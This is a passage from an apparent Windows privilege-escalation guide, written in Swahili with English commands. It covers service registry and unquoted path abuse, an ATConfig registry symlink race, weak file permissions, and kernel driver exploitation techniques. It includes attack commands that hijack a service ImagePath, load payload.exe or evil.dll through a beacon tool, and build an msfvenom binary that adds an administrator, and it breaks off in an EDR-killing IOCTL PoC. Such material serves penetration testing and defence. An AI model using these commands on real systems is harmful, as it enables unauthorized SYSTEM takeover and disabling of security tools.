> Ikiwa huduma hairuhusu mtumiaji wa kawaida kuiwasha upya, angalia ikiwa hujiwasha kiotomatiki wakati wa kuwasha mfumo, ina kitendo cha kushindwa kinachoianzisha tena, au inaweza kuwashwa kwa njia isiyo ya moja kwa moja na programu inayoitumia.

### Ruhusa za kurekebisha registry ya huduma

Unapaswa kuangalia ikiwa unaweza kurekebisha registry yoyote ya huduma.\
Unaweza **kuangalia** **ruhusa** zako kwenye **registry** ya huduma kwa kufanya:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Kagua kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za registry zinazowezesha kuandika kwenye key maalum ya service. Entry ya ACL pekee haithibitishi ufikiaji halisi: entries za deny, token ya sasa na ruhusa zilizorithiwa ni muhimu. Haki za registry key ni tofauti na haki za service object za `SERVICE_CHANGE_CONFIG` na `SERVICE_START`. Escalation pia inahitaji sehemu ya usanidi wa service inayoweza kutumika, njia ya kuwasha service na service identity yenye mapendeleo zaidi. Angalia [haki za registry key](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) na [marejeo ya haki za ufikiaji wa service](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ya Microsoft.

Kubadilisha Path ya binary inayotekelezwa:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race ya kuandika value yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda keys za **ATConfig** kwa kila mtumiaji, ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** hadi kwenye key ya session ya HKLM. **Registry symlink race** inaweza kuelekeza uandishi huo wenye ruhusa za juu hadi **path yoyote ya HKLM**, na hivyo kutoa primitive ya **kuandika value yoyote ya HKLM**.<sup>[[18]](#references)</sup>

Maeneo ya keys (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia au mabadiliko ya secure-desktop na mtumiaji anaweza kuiandikia.

Mtiririko wa unyonyaji (CVE-2026-24291 / ATConfig):

1. Weka value ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha kunakili kwa secure-desktop (kwa mfano, **LockWorkstation**), jambo linaloanzisha mtiririko wa AT broker.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapoamilishwa, badilisha key ya **HKLM Session ATConfig** iwe **registry link** inayoelekeza kwenye target ya HKLM iliyolindwa.
4. SYSTEM huandika value iliyochaguliwa na mshambulizi kwenye path ya HKLM iliyoelekezwa.

Ukipata uwezo wa kuandika value yoyote ya HKLM, tumia hilo kufanya LPE kwa kubadilisha values za usanidi wa huduma:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua huduma ambayo mtumiaji wa kawaida anaweza kuanzisha (kwa mfano, **`msiserver`**) na uiwashe baada ya uandishi. **Kumbuka:** utekelezaji wa exploit wa umma **hufunga workstation** kama sehemu ya race.

Zana za mfano (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Ruhusa za AppendData/AddSubdirectory kwenye registry ya Services

Ukiwa na ruhusa hii kwenye registry, inamaanisha **unaweza kuunda sub registries kutoka kwenye hii**. Kwa upande wa Windows services, hii **inatosha kutekeleza code yoyote:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa path ya executable haijawekwa ndani ya quotes, Windows itajaribu kutekeleza kila sehemu ya path inayoishia kabla ya space.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Orodhesha unquoted service paths zote, ukiondoa zile za huduma zilizojengewa ndani za Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Unaweza kugundua na kutumia** udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda binary ya service wewe mwenyewe kwa kutumia metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Hatua za Urejeshaji

Windows huruhusu watumiaji kubainisha hatua zitakazochukuliwa huduma inaposhindwa. Kipengele hiki kinaweza kusanidiwa ili kielekeze kwenye binary. Ikiwa binary hiyo inaweza kubadilishwa, privilege escalation inaweza kuwezekana. Maelezo zaidi yanapatikana kwenye [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Faili lengwa za script za scheduled task

Kwa task iliyowezeshwa inayoendesha `cmd.exe /c` pamoja na faili ya `.bat` au `.cmd`, kagua script iliyotajwa kwenye **hoja za kitendo** pamoja na `cmd.exe`. Hali hiyo hiyo inatumika kwa hoja ya faili iliyoainishwa wazi kwa interpreter, kama PowerShell `-File`. Ikiwa faili ya batch ya scheduled task ina mwito halisi wa PowerShell `-File`, kagua pia ACL ya script inayorejelewa; vigeu, masharti na uunganishaji wa amri kwenye shell huhitaji ufuatiliaji wa mikono. Script au saraka yake ya mzazi inayoweza kuandikwa na mtumiaji anayeita ni mwanya unaoweza kuwezesha utekelezaji kati ya akaunti tu ikiwa principal iliyosanidiwa ya task ni tofauti na mtumiaji huyo, na task inafikia kitendo hicho. ACL inayoruhusu kuongeza tu inaweza kuwa muhimu kwa scripts, lakini `exit` ya mapema au mtiririko mwingine wa udhibiti unaweza kufanya mistari iliyoongezwa isitekelezwe. Thibitisha ACL zinazotumika, [muktadha wa utekelezaji wa task](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), saraka ya kufanya kazi, kichochezi na sera ya udhibiti wa programu kabla ya kudai kuwa privilege escalation inawezekana. Orodha ya ukaguzi haipaswi kubadilisha script au kuanzisha task.

## Named streams kwenye faili zinazofikika

Kwenye NTFS, faili inayosomeka inaweza kuwa na stream yenye jina ya `:$DATA` ambayo maudhui yake hayaonyeshwi kwenye orodha ya kawaida ya saraka. Kwa seti ndogo na husika ya faili za chelezo au usanidi zinazofikika, kagua **majina na ukubwa** wa streams kabla ya kufungua maudhui yoyote; Windows huzionyesha kupitia [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), na PowerShell kupitia [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Jina la stream linalodokeza kuwepo kwa siri ni mwanya wa kuchunguza tu. Kagua ruhusa halisi za kusoma faili, kama mfumo wa faili unaunga mkono streams, kama stream ina credentials zinazoweza kutumika, na akaunti ambayo credentials hizo huithibitisha kweli. Epuka kuchanganua streams kwa kujirudia kwenye saraka nzima na kuchapisha maudhui ya streams wakati wa ukaguzi wa kawaida.

## Ingizo za helper ya Windows Driver Kit kwenye scheduled task

Windows Driver Kit ya hiari inajumuisha `StandaloneRunner.exe`, ambayo inaweza kutumia faili za `command.txt`, `reboot.rsf` na `working\rsf.rsf` za mradi kutoka kwenye saraka yake ya uendeshaji. Scheduled task au service inayoanzisha helper hii kwa akaunti yenye upendeleo inaweza kutumia ruhusa ya kuandika ya kiwango cha chini kwenye ingizo hizo kutekeleza amri katika muktadha wa akaunti hiyo, hata kama executable ya helper yenyewe imelindwa. Thibitisha kuwa kuna mtumiaji mwenye upendeleo anayezitumia na kwamba **faili zote mbili** za kando zinaweza kuundwa au kubadilishwa; kugundua helper pekee hakutoshi.

Kwa scheduled task, kagua [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ya kitendo chake na ACL za njia za faili hizo mbili za kando. Ikiwa task haijabainisha saraka ya kufanya kazi, saraka ya executable ni mwanya wa kuthibitisha tu, si uthibitisho wa mahali ambapo task husoma ingizo zake. Sharti la faili ya kufanya kazi ya mradi lazima pia litimizwe. Kagua principal halisi ya task badala ya kudhani kuwa inaendeshwa kama SYSTEM.

## Programu

### Programu Zilizosakinishwa

Kagua **ruhusa za binaries** (huenda ukaweza kubadilisha moja na kupata privilege escalation) na za **folda** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Njia ya ukarabati wa Checkmk Windows agent

[CVE-2024-0670](https://checkmk.com/werk/16361) huathiri matoleo ya zamani ya Checkmk Windows agents yaliyoandika faili za amri katika `C:\Windows\Temp`, kisha kutekeleza faili iliyokuwepo na iliyolindwa dhidi ya uandishi pale ubadilishaji uliposhindwa. Vendor alirekebisha suala hili katika 2.1.0p40, 2.2.0p23, 2.3.0b1, na 2.4.0b1. Kagua kiwango kamili cha patch kilichosakinishwa na ikiwa operesheni husika ya agent inaweza kuendeshwa; lebo ya tawi pekee kama `2.1` haiwezi kuthibitisha uwepo wa hatari. Enumeration inaweza kukagua toleo, hali ya service, na ruhusa za Temp bila kuunda faili au kuanzisha amri za agent.

#### Ukaguzi wa SAML service ya ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) iliathiri build 6210 na za awali za ADSelfService Plus; vendor aliirekebisha katika build 6211. Inahusika tu ikiwa SAML SSO **imewezeshwa au iliwahi kuwezeshwa**. Kwa hiyo, ingizo la bidhaa iliyosakinishwa au njia ya service ni kidokezo tu, si uthibitisho wa uwepo wa udhaifu: thibitisha build halisi, historia ya usanidi wa SAML, ufikikaji wa service kupitia mtandao, na akaunti inayoendesha service hiyo. Code execution kupitia service hurithi ruhusa za akaunti hiyo; utekelezaji wa SYSTEM unahitaji instance inayoendeshwa kama SYSTEM. Faili ya `OfflineBackup_*.ezip` inayosomeka katika saraka ya Backup ya bidhaa ni kidokezo tofauti kuhusu nakala rudufu iliyosimbwa kwa njia fiche, si ushahidi wa credential inayoweza kutumika au wa udhaifu huu wa SAML. Rekodi njia yake na ruhusa za ufikiaji bila kuifungua wakati wa enumeration ya kawaida.

#### Jenkins controller na mipaka ya akaunti za domain

Kwenye Windows Jenkins controller, tofautisha ruhusa ya kuunda au kusanidi job na ruhusa ya kuiwasha: [Jenkins huzitaja kama ruhusa tofauti za `Job/Create`, `Job/Configure`, na `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ratiba iliyosanidiwa au remote trigger inaweza kutoa njia nyingine ya kuendesha build, lakini thibitisha kuwa imewezeshwa na build inaendeshwa kweli. Utekelezaji hutumia utambulisho wa controller au agent iliyochaguliwa, na credential iliyohifadhiwa inaweza kutumiwa tu ikiwa job inaweza kufikia scope yake. Kando na hilo, kagua ufikiaji wa metadata ya `JENKINS_HOME`: Jenkins huhifadhi taarifa za credential na funguo za usimbaji fiche katika `credentials.xml`, `secrets/hudson.util.Secret`, na `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Kuwepo kwao pekee hakufichui password; thibitisha **ruhusa ya kusoma faili zinazohitajika** na njia tofauti ya kutumia tena akaunti bila kuchapisha siri kwenye matokeo yanayoshirikiwa. Ikiwa akaunti hiyo ina ruhusa ya kuandika `scriptPath` ya AD user-object, thibitisha njia ya script inayoweza kuandikwa na consumer halisi wa logon au wa ratiba anayeendeshwa kama mtumiaji lengwa kabla ya kuichukulia kama utekelezaji kati ya watumiaji tofauti. Udhibiti zaidi wa group unahitaji uthibitishaji tofauti wa effective AD rights.

#### Utambulisho wa Azure Pipelines self-hosted agent

Kwa mradi wa Azure DevOps Server au Azure Pipelines, tofautisha ruhusa ya **kuunda au kuhariri** pipeline na ruhusa ya **kuianzisha kwenye queue** na kutumia agent pool iliyochaguliwa; [Microsoft inaeleza ruhusa za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) na [uidhinishaji wa pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) kando kando. Ikiwa akaunti yenye ruhusa ndogo inaweza kuwasilisha hatua ya script na kuendesha pipeline hiyo kwenye self-hosted Windows agent, hatua hiyo hutekelezwa kama [akaunti ya mfumo wa uendeshaji iliyosanidiwa kwa agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Thibitisha pipeline halisi, vizuizi vya branch/resource, pool iliyoidhinishwa, job inayoweza kuendeshwa, na utambulisho wa agent service kabla ya kudai mabadiliko ya ruhusa kati ya watumiaji au kwenda SYSTEM. Agent iliyosakinishwa, jukumu la mradi, au ruhusa ya kuandika kwenye repository ni vidokezo tu; kagua ruhusa na metadata ya local service bila kuanzisha build wakati wa passive enumeration.

#### Credentials za Microsoft Entra Connect Sync

[Microsoft hutofautisha](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **akaunti ya ADSync service**, inayoendesha synchronization service na kufikia database yake ya SQL, na **akaunti ya AD DS connector**, ambayo ruhusa zake za directory hutegemea vipengele vya sync vilivyosaniwa. Credentials za connector huhifadhiwa zikiwa zimesimbwa kwa njia fiche katika database hiyo, huku nyenzo za ufunguo [zikilindwa na DPAPI chini ya akaunti ya ADSync service](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sync service iliyosakinishwa, group inayoonekana kuwa ya local administrator, au ufikiaji wa database pekee havithibitishi kuwepo kwa credential inayoweza kufumbuliwa au kupandishwa kwa ruhusa kwenye domain. Kagua kando ruhusa halisi za kusoma database, ufikiaji wa service account/funguo, mpangilio wa usakinishaji na SQL, utambulisho wa connector uliosanidiwa, na effective AD privileges za utambulisho huo. Enumeration ya kawaida inapaswa kuonyesha metadata ya service na ufikiaji pekee, si kuuliza au kuchapisha siri zilizohifadhiwa.

#### Ruhusa za printer driver support DLL

Printer driver iliyosakinishwa inaweza kuhifadhi support DLLs chini ya `C:\ProgramData` na kuzipakia ndani ya mchakato wa uchapishaji wenye ruhusa za juu zaidi. Kagua saraka halisi ya driver na ACL za DLL, ikijumuisha saraka za juu na reparse points, hata kama printer WMI enumeration imekataliwa. Kwa [suala la Ricoh printer-driver CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), njia iliyoripotiwa ilikuwa `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [ufichuzi wa awali](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) unaeleza upakiaji wa DLL na `PrintIsolationHost.exe`. ACL inayoruhusu kuandika ni kidokezo tu: thibitisha effective write access baada ya kuzingatia deny entries, kuwa driver husika imesakinishwa na inapakia faili chini ya utambulisho wenye ruhusa za juu, na ikiwa driver iliyosasishwa na vendor au security program imerekebisha usakinishaji huo. Usihitimishe kuwa kuna udhaifu kutokana na jina la saraka au toleo la driver pekee.

### Ruhusa za Kuandika

Kagua ikiwa unaweza kurekebisha faili fulani ya usanidi ili kusoma faili maalum, au ikiwa unaweza kurekebisha binary itakayoendeshwa na akaunti ya Administrator (schedtasks).

Njia moja ya kutafuta ruhusa dhaifu za folda/faili kwenye mfumo ni kufanya:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Uendelevu/utekelezaji wa kiotomatiki wa plugin za Notepad++

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo chini ya folda zake za `plugins`. Ikiwa kuna usakinishaji unaobebeka/kunakiliwa unaoweza kuandikwa, kuweka plugin hasidi husababisha utekelezaji wa msimbo kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa (ikiwemo kupitia `DllMain` na callbacks za plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Kuendesha wakati wa kuwasha

**Angalia kama unaweza kubadilisha registry au binary itakayoendeshwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili upate maelezo zaidi kuhusu **maeneo ya autoruns yanayoweza kutumika kuongeza privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta drivers zinazoweza kuwa za **wahusika wengine, zisizo za kawaida/zenye udhaifu**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ikiwa driver inafichua primitive ya kusoma/kuandika kernel kiholela (jambo la kawaida katika IOCTL handlers zilizoundwa vibaya), unaweza kupandisha priviliji kwa kuiba SYSTEM token moja kwa moja kutoka kwenye kumbukumbu ya kernel.<sup>[[13]](#references)</sup> Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Kwa hitilafu za race-condition ambapo mwito ulio hatarini hufungua njia ya Object Manager inayodhibitiwa na mshambulizi, kuchelewesha kimakusudi utafutaji (kwa kutumia vipengele vya njia vyenye urefu wa juu zaidi au minyororo mirefu ya directory) kunaweza kupanua dirisha la muda kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF za cancel-safe queue, ufichuaji wa paged-pool, na pivots za I/O ring

Baadhi ya minyororo ya Windows kernel LPE inaweza kujengwa kutokana na hitilafu mbili dhaifu zikitazamwa kivyake: **race ya muda wa maisha wa cancel-safe queue** inayofuta request/CBD wakati lock ya queue bado imeshikiliwa, na ufichuaji wa **lock-release-before-copy** unaovujisha allocation ya paged-pool iliyofutwa wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Vidokezo vya ukaguzi na unyonyaji:

- **Free-under-lock + cancel afterwards**: tafuta njia ya mafanikio inayofanya **Acquire -> CompleteRequest/free -> Release**, huku njia ya cancel ikifanya **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa njia ya mafanikio inafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kuachilia lock ya CBDQ/CSQ, thread iliyozuiwa ndani ya `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofutwa kwenye callback ya remove ya driver.
- **Reclaim the freed queue object** kwa allocation ya paged-pool inayodhibitiwa na mshambulizi na yenye ukubwa sawa. `NPFS` Data Queue Entries ni muhimu kwa sababu payload na ukubwa wake vinaweza kudhibitiwa, na baadaye unaweza kuvichunguza kwa pipe read/peek operations. Ikiwa object iliyofutwa ina list links, zibadilishe ziwe **cyclic list ya fake request nodes kwenye user memory** ili driver iendelee kuchakata request structures zilizobainishwa na mshambulizi badala ya kusimama kwenye kichwa asilia cha list.
- **Boresha write inayotabirika**: ikiwa fake request inaelekeza upya nested context pointer inayotumiwa na bookkeeping writes (timestamps / QPC / sehemu zilizo karibu na refcount), unaweza kupata **kernel write inayodhibiti anwani lakini si thamani**. Katika hali hiyo, lenga sehemu ya **length/size** ya sprayed pool object badala ya pointer ya mwisho ya code/data, kisha pitia spray hadi object iliyoharibiwa ikupe **usomaji wa paged-pool nje ya mipaka**.
- **Muundo wa raceable disclosure**: syscall yoyote inayofanya `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ni mgombea mzuri. Uaminifu huongezeka mshambulizi anapoweza kuongeza ukubwa wa buffer inayokopiwa (kwa mfano, kwa kuongeza entries nyingi za list/resource zinazoongeza ukubwa wa mwisho wa allocation ya serializer), kwa kuwa copy ndefu zaidi hupanua dirisha la kubadilisha allocation bila kulazimika kusababisha mashine ku-crash.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays ni targets bora za ufichuaji kwa sababu ukubwa wake wa paged-pool unaweza kudhibitiwa na mshambulizi (`8 * regBufferCnt`), na kila element ni kernel pointer inayoelekeza kwenye `_IOP_MC_BUFFER_ENTRY`. Vujisha mojawapo ya arrays hizi, tambua `IORING_OBJECT` inayoizunguka, kisha haribu **`RegBuffers`** na **`RegBuffersCount`** ili shughuli zinazofuata za I/O ring zitumie entries zilizoghushiwa na mshambulizi na kutoa usomaji/uandishi wa kernel kiholela. Ikiwa write pekee inayopatikana inakupa byte isiyobadilika (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **writes zinazopishana zisizolingana na alignment** ili kuunda user pointer inayojirudia kwa byte ileile, kama `0x0101010101010101`, i-map kwa `VirtualAlloc`, kisha uweke forged registered-buffer array hapo.<sup>[[30]](#references)</sup>

Viashiria muhimu vya debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Mara tu unapopata arbitrary kernel read/write kutoka kwenye I/O ring iliyoharibika, iba token ya SYSTEM kwa kutumia workflow ya kawaida ya post-primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za memory corruption kwenye Registry hive

Athari za kisasa za hive hukuwezesha kupanga layouts zinazotabirika, kutumia descendants za HKLM/HKU zinazoweza kuandikwa, na kubadilisha corruption ya metadata kuwa overflows za kernel paged-pool bila driver maalum. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Kuchanganya aina katika direct mode ya `RtlQueryRegistryValues` kupitia paths zinazodhibitiwa na mshambuliaji

Baadhi ya drivers hupokea registry path kutoka userland, huthibitisha tu kwamba ni string halali ya UTF-16, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` kwa `RTL_QUERY_REGISTRY_DIRECT` kuelekeza kwenye scalar ya stack kama vile `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hutafsiriwa kulingana na aina **halisi** ya registry, si aina ambayo msanidi alitarajia.

Hii hutengeneza primitives mbili zenye manufaa:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: path kamili ya `\Registry\...` inayodhibitiwa na mtumiaji huwezesha driver kuuliza keys zilizochaguliwa na mshambuliaji, kufichua kama zipo kupitia return codes/logs, na wakati mwingine kusoma values ambazo mpigaji hangeweza kufikia moja kwa moja.
- **Kernel memory corruption**: destination ya scalar kama `&readValue` hutafsiriwa kimakosa kama `REG_QWORD`, `UNICODE_STRING`, au buffer ya binary yenye ukubwa maalum, kutegemea aina ya registry value.

Vidokezo vya vitendo vya exploitation:

- **Mitigation ya Windows 8+**: ikiwa query inafikia **untrusted hive** kwa `RTL_QUERY_REGISTRY_DIRECT` lakini bila `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers hu-crash kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili kudumisha uwezekano wa exploitation, tafuta **keys zinazoweza kuandikwa na mshambuliaji ndani ya trusted system hives** badala ya kuweka values chini ya `HKCU`.
- **Kuweka values kwenye trusted hive**: tumia NtObjectManager kuorodhesha descendants zinazoweza kuandikwa za `\Registry\Machine`, kisha endesha tena scan kwa token ya **low-integrity** iliyorudiwa ili kupata keys zinazoweza kufikiwa kutoka kwenye mazingira ya sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: uandishi wa moja kwa moja wa baiti 8 kwenye `int` ya baiti 4 huharibu data ya stack iliyo karibu na unaweza kufuta kwa sehemu pointer ya callback/function iliyo karibu.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode hutegemea `EntryContext` kuelekeza kwenye `UNICODE_STRING`. Ikiwa msimbo kwanza unapakia `REG_DWORD` inayodhibitiwa na mshambuliaji kwenye scalar ya stack kisha unatumia tena buffer hiyo hiyo kwa usomaji wa string, mshambuliaji hudhibiti `Length`/`MaximumLength` na huathiri kwa sehemu pointer ya `Buffer`, na hivyo kupata uandishi wa kernel unaodhibitiwa kwa kiasi.
- **`REG_BINARY`**: kwa data kubwa ya binary, direct mode huchukulia `LONG` ya kwanza kwenye `EntryContext` kuwa ukubwa wa buffer wenye alama. Ikiwa usomaji wa awali wa `REG_DWORD` utaacha thamani **hasi** inayodhibitiwa na mshambuliaji kwenye scalar inayotumiwa tena, query inayofuata ya `REG_BINARY` hunakili baiti za mshambuliaji moja kwa moja juu ya nafasi za stack zilizo karibu. Mara nyingi hii ndiyo njia rahisi zaidi ya kufuta pointer ya callback kikamilifu.

Muundo muhimu wa kutafuta: **usomaji wa registry wa aina tofauti kwenye variable ileile ya stack bila kuianzisha upya**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zinazotumiwa tena, na njia za msimbo ambapo usomaji wa kwanza wa registry huamua kama usomaji wa pili utafanyika.

#### Kutumia vibaya kukosekana kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya drivers za wahusika wengine zilizosainiwa huunda device object yao kwa SDDL imara kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila flag hii, DACL salama haitatekelezwa kifaa kinapofunguliwa kupitia path iliyo na kipengele cha ziada, hivyo kuruhusu mtumiaji yeyote asiye na upendeleo kupata handle kwa kutumia path ya namespace kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye tukio halisi)

Mtumiaji akishoweza kufungua kifaa, anaweza kutumia vibaya IOCTL za upendeleo mkubwa zinazotolewa na driver kwa LPE na kufanya mabadiliko yasiyoruhusiwa. Uwezo ulioonekana kwenye matukio halisi:
- Kurudisha handles zenye ufikiaji kamili kwa processes zisizochaguliwa (wizi wa token / shell ya SYSTEM kupitia DuplicateTokenEx/CreateProcessAsUser).
- Kusoma/kuandika raw disk bila vizuizi (kufanya mabadiliko offline, mbinu za persistence wakati wa boot).
- Kusitisha processes zisizochaguliwa, zikiwemo Protected Process/Light (PP/PPL), na kuruhusu kuua AV/EDR kutoka user land kupitia kernel.

Muundo wa chini kabisa wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

